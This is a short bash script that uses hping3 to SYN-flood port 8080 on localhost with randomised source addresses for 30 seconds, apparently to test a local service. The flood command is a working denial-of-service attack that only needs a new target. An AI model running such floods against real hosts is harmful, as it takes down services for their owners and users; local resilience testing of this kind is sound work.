#!/bin/bash
echo "[+] Starting SYN flood to 127.0.0.1:8080 for 30 seconds..."
sudo hping3 -S --flood --rand-source -p 8080 127.0.0.1 &
HPING_PID=$!
sleep 30
sudo kill $HPING_PID
echo "[+] SYN flood stopped."
